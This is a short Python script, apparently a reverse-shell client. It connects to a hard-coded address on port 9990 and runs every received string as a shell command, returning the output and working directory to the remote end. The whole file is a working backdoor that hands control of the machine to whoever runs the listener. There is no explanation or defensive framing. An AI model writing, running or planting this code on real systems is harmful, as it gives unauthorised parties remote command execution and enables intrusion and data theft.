import socket
import os 
import subprocess

s = socket.socket()
host = '10.118.114.138'
port = 9990

s.connect((host,port))

while True:
    data = s.recv(1024)
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))

    if len(data) > 0 :
        ter = subprocess.Popen(data[:].decode("utf-8"), shell=True,stdout = subprocess.PIPE, stdin = subprocess.PIPE, stderr = subprocess.PIPE)
        output_type = ter.stdout.read() + ter.stderr.read()   
        out_str = str(output_type, "utf-8")
        current = os.getcwd() + "$"
        s.send(str.encode(out_str + current))

        print(out_str)